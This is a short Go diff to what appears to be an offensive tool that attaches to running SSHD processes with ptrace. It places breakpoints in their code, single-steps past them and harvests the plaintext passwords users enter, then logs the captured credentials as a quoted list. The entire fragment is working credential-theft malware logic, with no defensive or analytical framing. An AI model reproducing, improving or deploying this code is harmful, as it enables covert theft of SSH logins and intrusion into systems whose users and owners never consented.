@@ -254,6 +254,7 @@ handler:
 		util.LogStreamPrintf(logStream, "\n\nWe have password 0x%x (%s)\n\n", password, password)
 	}
 	if password != "" {
+		success = true
 		passwords = append(passwords, password)
 	}
 	// remove breakpoint
@@ -265,15 +266,14 @@ handler:
 	}
 	// one byte back, go back before 0xCC, at the start of code pattern
 	regs.Rip--
+	util.LogStreamPrintf(logStream, "Setting RIP back one byte to 0x%x", regs.Rip)
 	err = unix.PtraceSetRegs(pid, regs)
 	if err != nil {
 		util.LogStreamPrintf(logStream, "set regs back: %v", err)
 		return
 	}
-	regs = dump_regs(pid, logStream)
-	if regs != nil {
-		dump_code(pid, uintptr(regs.Rip), logStream)
-	}
+	dump_code(pid, uintptr(regs.Rip), logStream)
+
 	// single step to execute original code
 	err = unix.PtraceSingleStep(pid)
 	if err != nil {
@@ -326,7 +326,12 @@ handler:
 		util.LogStreamPrintf(logStream, "uncaught exit status of %d: %d", pid, wstatus.ExitStatus())
 	}
 
-	util.LogStreamPrintf(logStream, "SSHD session %d done, passwords are %s", pid, passwords)
+	res := ""
+	for _, p := range passwords {
+		res = fmt.Sprintf("%s, %s", res, strconv.Quote(p))
+	}
+
+	util.LogStreamPrintf(logStream, "SSHD session %d done, passwords are %s", pid, res)
 }
 
 // dump registers' values and the registers themselves
